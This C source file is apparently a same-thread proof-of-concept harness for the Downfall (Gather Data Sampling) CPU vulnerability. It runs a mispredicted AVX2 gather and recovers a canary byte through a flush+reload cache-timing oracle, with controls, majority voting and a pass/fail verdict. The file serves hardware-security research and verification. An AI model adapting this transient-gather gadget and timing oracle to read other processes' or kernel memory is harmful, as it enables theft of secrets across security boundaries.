/*
 * Same-thread Downfall / Gather Data Sampling canary (CVE-2022-40982).
 *
 * Follows the published single-thread sequence from the Downfall
 * materials (Daniel Moghimi, "Downfall: Exploiting Speculative Data
 * Gathering", USENIX Security 2023;
 * https://github.com/flowyroll/downfall). See downfall.S for the
 * assembly side.
 *
 * SPEC=1 is the measurement. Each attempt is SPEC_INNER (30) calls.
 * Twenty-five retire an AVX2 vpgatherdd of a page filled with one byte.
 * Five (j % 6 == 0, including the last) use a PROT_NONE base and are
 * architecturally not taken. The oracle is clflushed before every call.
 * The reload runs after the loop, so it follows the last call. That
 * call encodes all four bytes of the gather's low dword; a uniform page
 * makes them one class. On this i3-6100 the class matches the training
 * page. The gather destination is ymm5. Varying ymm0 does not move it.
 * Nothing here reads kernel memory, another thread, or another process.
 *
 * Oracle geometry matches the i3-6100 lab: stride 0x1040, hot if the
 * reload is under 150 cycles, class = (byte ^ 0x3f) & 0x3f.
 * Canary 0x42 is class 61. Canary 0x24 is class 27.
 *
 * A round is a majority round when hits * 2 > TRIALS. An arm is
 * repeatable in this process when majority_rounds * 2 > ROUNDS.
 *
 *   SELFTEST=1      geometry only, then exit
 *   CPU=1           logical CPU to pin
 *   CANARY=0x42     byte replicated through the source buffer
 *   TRIALS=64
 *   ROUNDS=8
 *   SPEC_NOENCODE=1 last call gathers, but its touch misses the oracle
 */

#define _GNU_SOURCE

#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <ucontext.h>

#define SLOT_SIZE      0x1040
#define NCLASS         64
#define HOT_CYCLES     150
#define XOR_KEY        0x3f
#define DEFAULT_CPU    1
#define DEFAULT_ROUNDS 8
#define DEFAULT_TRIALS 64
#define DEFAULT_CANARY 0x42

#define MODE_GATHER   0
#define MODE_FIXED    1
#define MODE_NOGATHER 2
#define MODE_ARCH     3

#define SPEC_INNER  30
#define SPEC_DELAY  100
#define TRAIN_X     0x10
#define NC_BASE     0x5678ff0000000000ull

#define CLS_ZERO       ((0x00 ^ XOR_KEY) & 0x3f)          /* 63 */
#define CLS_FIXED      1
#define CLS_ALT        ((0x24 ^ XOR_KEY) & 0x3f)          /* 27 */

extern void gds_attempt(uint8_t *oracle, const uint8_t *source,
                        const uint32_t *perm, const uint32_t *index,
                        int mode, uintptr_t fault_base);
extern char gds_skip[];

static uint8_t *oracle;
static uint8_t source[64] __attribute__((aligned(64)));
static uint32_t perm[8] __attribute__((aligned(32))) = {
    0, 1, 2, 3, 4, 5, 6, 7
};
static uint32_t gindex[8] __attribute__((aligned(32)));

static volatile sig_atomic_t armed;
static volatile unsigned long fault_count;
static volatile unsigned long stray_faults;

static int canary = DEFAULT_CANARY;
static int rounds = DEFAULT_ROUNDS;
static int trials = DEFAULT_TRIALS;
static int cpu_id = DEFAULT_CPU;
static int free_ymm;
static int spec_const;
static int spec_noencode;
static int spec_extra_cls = CLS_ALT;
static uintptr_t fault_base;
static uint8_t *spec_sink;

static int cls_of(int byte)
{
    return (byte ^ XOR_KEY) & 0x3f;
}

static void *slot(int cls)
{
    return oracle + (size_t)cls * SLOT_SIZE;
}

static void fault_handler(int sig, siginfo_t *si, void *ctx)
{
    ucontext_t *uc = (ucontext_t *)ctx;

    (void)sig;
    (void)si;
    if (!armed) {
        stray_faults++;
        _exit(3);
    }
    fault_count++;
    uc->uc_mcontext.gregs[REG_RIP] = (greg_t)gds_skip;
}

static void install_handler(void)
{
    struct sigaction sa;

    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = fault_handler;
    sa.sa_flags = SA_SIGINFO;
    sigemptyset(&sa.sa_mask);
    if (sigaction(SIGSEGV, &sa, NULL) != 0 ||
        sigaction(SIGBUS, &sa, NULL) != 0) {
        perror("sigaction");
        exit(1);
    }
}

static void pin_cpu(int cpu)
{
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0) {
        perror("sched_setaffinity");
        exit(1);
    }
}

static inline void flush_line(void *p)
{
    asm volatile(
        "clflush (%0)\n\t"
        "mfence\n\t"
        "lfence\n\t"
        :: "r"(p) : "memory");
}

static inline uint64_t reload_time(void *p)
{
    unsigned lo, hi;
    uint64_t a, b;

    asm volatile("mfence\n\tlfence\n\trdtsc" : "=a"(lo), "=d"(hi) :: "memory");
    a = ((uint64_t)hi << 32) | lo;
    asm volatile("mov (%0), %%eax" :: "r"(p) : "eax", "memory");
    asm volatile("lfence\n\trdtsc" : "=a"(lo), "=d"(hi) :: "memory");
    b = ((uint64_t)hi << 32) | lo;
    return b - a;
}

static int selftest(void)
{
    int c;
    uint64_t hot, cold;

    for (c = 0; c < NCLASS; c++)
        flush_line(slot(c));
    asm volatile("mov (%0), %%eax" :: "r"(slot(61)) : "eax", "memory");
    hot = reload_time(slot(61));
    cold = reload_time(slot(27));
    printf("selftest hot61=%llu cold27=%llu threshold=%d %s\n",
           (unsigned long long)hot, (unsigned long long)cold, HOT_CYCLES,
           (hot < HOT_CYCLES && cold >= HOT_CYCLES) ? "OK" : "FAIL");
    return hot < HOT_CYCLES && cold >= HOT_CYCLES;
}

struct arm_result {
    int hits_expect;
    int hits_control;
    int hits_zero;
    int hits_fixed;
    int faults;
    uint64_t t_expect;
    uint64_t t_fixed;
};

static struct arm_result run_arm(int mode, int expect, int control)
{
    struct arm_result r;
    int i;

    memset(&r, 0, sizeof(r));
    r.t_expect = ~0ULL;
    r.t_fixed = ~0ULL;

    for (i = 0; i < trials; i++) {
        unsigned long before = fault_count;
        uint64_t te, tc, tz, tf;

        armed = 1;
        gds_attempt(oracle, source, perm, gindex, mode, fault_base);
        armed = 0;

        te = reload_time(slot(expect));
        tc = reload_time(slot(control));
        tz = reload_time(slot(CLS_ZERO));
        tf = reload_time(slot(CLS_FIXED));
        if (te < r.t_expect)
            r.t_expect = te;
        if (tf < r.t_fixed)
            r.t_fixed = tf;
        if (te < HOT_CYCLES)
            r.hits_expect++;
        if (tc < HOT_CYCLES)
            r.hits_control++;
        if (tz < HOT_CYCLES)
            r.hits_zero++;
        if (tf < HOT_CYCLES)
            r.hits_fixed++;
        r.faults += (int)(fault_count - before);
    }
    return r;
}

static int majority(int hits)
{
    return hits * 2 > trials;
}

static int env_int(const char *name, int def)
{
    const char *s = getenv(name);
    char *end;
    long v;

    if (s == NULL || s[0] == '\0')
        return def;
    v = strtol(s, &end, 0);
    if (end == s)
        return def;
    return (int)v;
}

static uint8_t *spec_region;
static volatile size_t *spec_bound_p;
static uint8_t *spec_array;
static uintptr_t spec_mal_addr = NC_BASE;

static int spec_setup(void)
{
    spec_region = mmap(NULL, 8192, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (spec_region == MAP_FAILED)
        return 0;
    memset(spec_region, canary, 4096);
    spec_array = spec_region;
    spec_bound_p = (volatile size_t *)(spec_region + 4096 + 0x2C0);
    *spec_bound_p = 0x20;
    return 1;
}

/* Mispredicted gather. The bound line is only flushed, never rewritten, so
 * the compare stays slow. Training x is architecturally taken and gathers
 * spec_array. Attack x is architecturally not taken; its base is
 * spec_mal_addr. touch is the encode buffer. The caller passes the oracle
 * for training, and a sink for the final attack call when SPEC_NOENCODE=1.
 * ymm5 is the gather destination and is not cleared between calls. ymm0 is
 * a bystander fill from source. */
static void __attribute__((noinline)) spec_gadget(size_t x, int fill,
                                                   const uint8_t *touch)
{
    asm volatile("vpxor %%ymm1, %%ymm1, %%ymm1\n\t"
                 "vpcmpeqb %%ymm2, %%ymm2, %%ymm2\n\t"
                 ::: "memory");
    if (fill)
        asm volatile("vmovups (%0), %%ymm0\n\t"
                     "vmovups 32(%0), %%ymm0\n\t"
                     :: "r"(source) : "memory");
    else
        asm volatile("vpxor %%ymm0, %%ymm0, %%ymm0\n\t" ::: "memory");

    if (x < *spec_bound_p) {
        if (spec_const) {
            asm volatile(
                "mov $0x42, %%eax\n\t"
                "and $0xff, %%eax\n\t"
                "xor $0x3f, %%eax\n\t"
                "and $0x3f, %%eax\n\t"
                "imul $0x1040, %%eax, %%eax\n\t"
                "mov (%0, %%rax), %%eax\n\t"
                :
                : "r"(touch)
                : "rax", "memory");
            return;
        }
        asm volatile(
            "vpgatherdd %%ymm2, 0(%0, %%ymm1, 1), %%ymm5\n\t"
            "vmovd %%xmm5, %%eax\n\t"
            "mov %%eax, %%ebx\n\t"
            "mov %%eax, %%ecx\n\t"
            "mov %%eax, %%edx\n\t"
            "and $0xff, %%eax\n\t"
            "xor $0x3f, %%eax\n\t"
            "and $0x3f, %%eax\n\t"
            "imul $0x1040, %%eax, %%eax\n\t"
            "mov (%1, %%rax), %%eax\n\t"
            "shr $8, %%ebx\n\t"
            "and $0xff, %%ebx\n\t"
            "xor $0x3f, %%ebx\n\t"
            "and $0x3f, %%ebx\n\t"
            "imul $0x1040, %%ebx, %%ebx\n\t"
            "mov (%1, %%rbx), %%ebx\n\t"
            "shr $16, %%ecx\n\t"
            "and $0xff, %%ecx\n\t"
            "xor $0x3f, %%ecx\n\t"
            "and $0x3f, %%ecx\n\t"
            "imul $0x1040, %%ecx, %%ecx\n\t"
            "mov (%1, %%rcx), %%ecx\n\t"
            "shr $24, %%edx\n\t"
            "and $0xff, %%edx\n\t"
            "xor $0x3f, %%edx\n\t"
            "and $0x3f, %%edx\n\t"
            "imul $0x1040, %%edx, %%edx\n\t"
            "mov (%1, %%rdx), %%edx\n\t"
            :
            : "r"((uintptr_t)spec_array + x), "r"(touch)
            : "rax", "rbx", "rcx", "rdx", "memory");
    }
}

static void spec_counts(int fill, int expect, int *hit_exp, int *hit_zero,
                         int *hit_mem, int *hit_ff)
{
    size_t train = TRAIN_X;
    size_t mal = (size_t)(spec_mal_addr - (uintptr_t)spec_array);
    int mem_cls = cls_of(0x11);
    int ff_cls = spec_extra_cls;
    int t;

    *hit_exp = 0;
    *hit_zero = 0;
    *hit_mem = 0;
    *hit_ff = 0;
    for (t = 0; t < trials; t++) {
        int j;

        for (j = SPEC_INNER - 1; j >= 0; j--) {
            volatile int z;
            long m;
            size_t x;
            int c;

            for (c = 0; c < NCLASS; c++)
                asm volatile("clflush (%0)" :: "r"(slot(c)) : "memory");
            asm volatile("clflush (%0)" :: "r"((void *)spec_bound_p) : "memory");
            for (z = 0; z < SPEC_DELAY; z++)
                ;
            m = ((long)(j % 6) - 1) & ~0xFFFFL;
            m = m | (m >> 16);
            x = train ^ ((size_t)m & (mal ^ train));
            /* j == 0 is the last call and an attack index. Training calls
             * still encode into the oracle. */
            spec_gadget(x, fill,
                        (spec_noencode && j == 0) ? spec_sink : oracle);
        }
        if (reload_time(slot(expect)) < HOT_CYCLES)
            (*hit_exp)++;
        if (reload_time(slot(CLS_ZERO)) < HOT_CYCLES)
            (*hit_zero)++;
        if (reload_time(slot(mem_cls)) < HOT_CYCLES)
            (*hit_mem)++;
        if (reload_time(slot(ff_cls)) < HOT_CYCLES)
            (*hit_ff)++;
    }
}

static int gather_mode(void)
{
    return free_ymm ? 4 : MODE_GATHER;
}

/* FAULT=null (default), nc, prot, or mixed. mixed lets element 0 complete
 * from a page of 0x11 and faults the later elements on the next page. */
static int setup_fault(void)
{
    const char *f = getenv("FAULT");
    uint8_t *p;
    int i;

    fault_base = 0;
    if (f == NULL || f[0] == '\0' || strcmp(f, "0") == 0 ||
        strcmp(f, "null") == 0)
        return 1;
    if (strcmp(f, "nc") == 0) {
        fault_base = (uintptr_t)0x5678ff0000000000ull;
        return 1;
    }
    if (strcmp(f, "prot") == 0) {
        p = mmap(NULL, 4096, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (p == MAP_FAILED)
            return 0;
        fault_base = (uintptr_t)p;
        return 1;
    }
    if (strcmp(f, "mixed") == 0) {
        p = mmap(NULL, 8192, PROT_READ | PROT_WRITE,
                 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (p == MAP_FAILED)
            return 0;
        memset(p, 0x11, 4096);
        if (mprotect(p + 4096, 4096, PROT_NONE) != 0)
            return 0;
        fault_base = (uintptr_t)p;
        gindex[0] = 0;
        for (i = 1; i < 8; i++)
            gindex[i] = 4096;
        return 1;
    }
    fprintf(stderr, "FAULT must be null, nc, prot, or mixed\n");
    return 0;
}

static int scan_classes(int mode)
{
    int hits[NCLASS];
    int c, i;

    memset(hits, 0, sizeof(hits));
    for (c = 0; c < NCLASS; c++) {
        for (i = 0; i < trials; i++) {
            unsigned long before = fault_count;

            armed = 1;
            gds_attempt(oracle, source, perm, gindex, mode, fault_base);
            armed = 0;
            if (fault_count == before) {
                printf("verdict: VOID nofault class=%d\n", c);
                return 2;
            }
            if (reload_time(slot(c)) < HOT_CYCLES)
                hits[c]++;
        }
        if (hits[c] > 0)
            printf("class %d hits=%d/%d\n", c, hits[c], trials);
    }
    printf("scan faults=%lu mode=%d base=0x%llx\n",
           fault_count, mode, (unsigned long long)fault_base);
    printf("verdict: SCAN\n");
    return 0;
}

static void setup_oracle(void)
{
    size_t bytes = (size_t)SLOT_SIZE * NCLASS;
    size_t i;

    oracle = mmap(NULL, bytes, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (oracle == MAP_FAILED) {
        perror("mmap");
        exit(1);
    }
    for (i = 0; i < bytes; i += 4096)
        oracle[i] = 1;
    if (bytes % 4096)
        oracle[bytes - 1] = 1;
}

int main(void)
{
    int expect, control, only_self;
    int g_maj = 0, a_maj = 0, n_maj = 0, f_maj = 0;
    int g_bad = 0, f_leak = 0;
    int r;
    int pass;
    const char *verdict;

    if (cls_of(0x42) != 61 || cls_of(0x24) != 27 || cls_of(0x00) != 63) {
        fprintf(stderr, "class map broken\n");
        return 2;
    }

    canary = env_int("CANARY", DEFAULT_CANARY);
    rounds = env_int("ROUNDS", DEFAULT_ROUNDS);
    trials = env_int("TRIALS", DEFAULT_TRIALS);
    cpu_id = env_int("CPU", DEFAULT_CPU);
    only_self = env_int("SELFTEST", 0);
    free_ymm = env_int("FREE", 0);
    spec_const = env_int("SPEC_CONST", 0);
    spec_noencode = env_int("SPEC_NOENCODE", 0);

    if (canary < 0 || canary > 255 || rounds < 1 || rounds > 64 ||
        trials < 1 || trials > 100000 || cpu_id < 0) {
        fprintf(stderr, "bad CANARY, ROUNDS, TRIALS, or CPU\n");
        return 2;
    }
    expect = cls_of(canary);
    control = (expect == CLS_ALT) ? 61 : CLS_ALT;
    if (expect == control || expect == CLS_ZERO || expect == CLS_FIXED ||
        expect == 0 || control == CLS_FIXED) {
        fprintf(stderr, "canary class %d collides with a control slot\n",
                expect);
        return 2;
    }

    if (!setup_fault()) {
        perror("setup_fault");
        return 2;
    }
    setup_oracle();
    install_handler();
    pin_cpu(cpu_id);
    memset(source, canary, sizeof(source));

    printf("downfall-oneshot cpu=%d canary=0x%02x class=%d control=%d zero=%d fixed=%d stride=0x%x hot<%d trials=%d rounds=%d\n",
           cpu_id, canary, expect, control, CLS_ZERO, CLS_FIXED,
           SLOT_SIZE, HOT_CYCLES, trials, rounds);

    if (!selftest()) {
        printf("verdict: VOID selftest\n");
        return 2;
    }
    if (only_self) {
        printf("verdict: SELFTEST\n");
        return 0;
    }
    if (env_int("SCAN", 0))
        return scan_classes(gather_mode());
    if (env_int("SPEC", 0)) {
        size_t mal;
        uint8_t *prot;
        int maj_42 = 0, bad_42 = 0, maj_24 = 0, bad_24 = 0;

        if (!spec_setup()) {
            perror("spec_setup");
            return 2;
        }
        prot = mmap(NULL, 4096, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (prot == MAP_FAILED) {
            perror("prot");
            return 2;
        }
        spec_mal_addr = (uintptr_t)prot;
        mal = (size_t)(spec_mal_addr - (uintptr_t)spec_array);
        if ((uintptr_t)spec_array + mal != spec_mal_addr) {
            printf("verdict: VOID mal-addr\n");
            return 2;
        }
        if (spec_noencode) {
            size_t bytes = (size_t)SLOT_SIZE * NCLASS;
            size_t i;

            spec_sink = mmap(NULL, bytes, PROT_READ | PROT_WRITE,
                             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            if (spec_sink == MAP_FAILED) {
                perror("sink");
                return 2;
            }
            for (i = 0; i < bytes; i += 4096)
                spec_sink[i] = 1;
        }
        printf("spec bound=0x20 train=0x%x mal=0x%llx noencode=%d inner=%d\n",
               TRAIN_X, (unsigned long long)spec_mal_addr, spec_noencode,
               SPEC_INNER);
        for (r = 0; r < rounds; r++) {
            int h_page, h_other, z, m;

            memset(spec_array, 0x42, 4096);
            spec_extra_cls = cls_of(0x24);
            spec_counts(1, cls_of(0x42), &h_page, &z, &m, &h_other);
            printf("round %d page=0x42 class61=%d/%d class27=%d/%d\n",
                   r, h_page, trials, h_other, trials);
            if (majority(h_page) && !majority(h_other))
                maj_42++;
            if (majority(h_other))
                bad_42++;

            memset(spec_array, 0x24, 4096);
            spec_extra_cls = cls_of(0x42);
            spec_counts(1, cls_of(0x24), &h_page, &z, &m, &h_other);
            printf("round %d page=0x24 class27=%d/%d class61=%d/%d\n",
                   r, h_page, trials, h_other, trials);
            if (majority(h_page) && !majority(h_other))
                maj_24++;
            if (majority(h_other))
                bad_24++;
        }
        printf("majority page42=%d/%d page24=%d/%d other42=%d other24=%d\n",
               maj_42, rounds, maj_24, rounds, bad_42, bad_24);
        pass = (maj_42 * 2 > rounds) && (maj_24 * 2 > rounds) &&
               (bad_42 * 2 <= rounds) && (bad_24 * 2 <= rounds);
        if (spec_noencode) {
            /* Training still encodes into the oracle. Only the last call
             * touches a sink. Cold means that call's encode was required. */
            int cold = maj_42 == 0 && maj_24 == 0 && bad_42 == 0 &&
                       bad_24 == 0;

            if (cold)
                verdict = "CONTROL cold";
            else if (pass)
                verdict = "CONTROL hot";
            else
                verdict = "CONTROL mixed";
            printf("verdict: %s\n", verdict);
            return cold ? 0 : 1;
        }
        printf("verdict: %s\n", pass ? "PASS" : "FAIL spec-cold");
        return pass ? 0 : 1;
    }

    for (r = 0; r < rounds; r++) {
        struct arm_result arch, none, fixed, gather;

        arch = run_arm(MODE_ARCH, expect, control);
        none = run_arm(MODE_NOGATHER, expect, control);
        fixed = run_arm(MODE_FIXED, expect, control);
        gather = run_arm(gather_mode(), expect, control);

        printf("round %d arch exp=%d/%d faults=%d t=%llu\n",
               r, arch.hits_expect, trials, arch.faults,
               (unsigned long long)arch.t_expect);
        printf("round %d nogather exp=%d/%d faults=%d t=%llu\n",
               r, none.hits_expect, trials, none.faults,
               (unsigned long long)none.t_expect);
        printf("round %d fixed slot1=%d/%d exp=%d/%d faults=%d t1=%llu texp=%llu\n",
               r, fixed.hits_fixed, trials, fixed.hits_expect, trials,
               fixed.faults, (unsigned long long)fixed.t_fixed,
               (unsigned long long)fixed.t_expect);
        printf("round %d gather exp=%d/%d ctl=%d/%d zero=%d/%d slot1=%d/%d faults=%d t=%llu\n",
               r, gather.hits_expect, trials, gather.hits_control, trials,
               gather.hits_zero, trials, gather.hits_fixed, trials,
               gather.faults, (unsigned long long)gather.t_expect);

        if (arch.faults != 0 || none.faults != 0 ||
            fixed.faults != trials || gather.faults != trials) {
            printf("verdict: VOID faults\n");
            return 2;
        }

        if (majority(arch.hits_expect))
            a_maj++;
        if (majority(none.hits_expect))
            n_maj++;
        if (majority(fixed.hits_fixed) && !majority(fixed.hits_expect))
            f_maj++;
        if (majority(fixed.hits_expect))
            f_leak++;
        if (majority(gather.hits_expect) &&
            !majority(gather.hits_control) &&
            !majority(gather.hits_zero))
            g_maj++;
        if (majority(gather.hits_control) || majority(gather.hits_zero))
            g_bad++;
    }

    printf("majority arch=%d/%d nogather=%d/%d fixed=%d/%d gather=%d/%d fixed_exp=%d gather_other=%d\n",
           a_maj, rounds, n_maj, rounds, f_maj, rounds, g_maj, rounds,
           f_leak, g_bad);

    pass = (a_maj * 2 > rounds) &&
           (n_maj * 2 <= rounds) &&
           (f_maj * 2 > rounds) &&
           (f_leak * 2 <= rounds) &&
           (g_maj * 2 > rounds) &&
           (g_bad * 2 <= rounds);

    if (pass)
        verdict = "PASS";
    else if (f_maj * 2 <= rounds)
        verdict = "FAIL no-transient-window";
    else if (g_maj * 2 <= rounds)
        verdict = "FAIL gather-cold";
    else
        verdict = "FAIL controls";
    printf("verdict: %s\n", verdict);
    return pass ? 0 : 1;
}
